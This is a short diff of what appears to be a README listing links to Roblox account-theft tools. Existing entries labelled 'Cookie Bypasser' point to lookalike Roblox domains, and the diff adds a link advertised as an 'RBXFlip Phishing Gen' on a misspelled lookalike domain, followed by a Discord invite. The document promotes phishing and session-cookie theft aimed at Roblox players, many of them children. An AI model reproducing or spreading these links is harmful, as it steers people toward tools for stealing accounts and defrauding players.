@@ -19,6 +19,8 @@
 [Cookie Bypasser 1](https://roblox.com.sc/generator/reflesher)
 [Cookie Bypasser 2](https://terminalholder.xyz/)
 
+[RBXFlip Phishing Gen (OP)](https://www.rbxfilp.com/generator/dashboard.php)
+
 ## [Join Discord Server](https://discord.gg/R9K9gg8HPZ)
 
 ### .gg/R9K9gg8HPZ
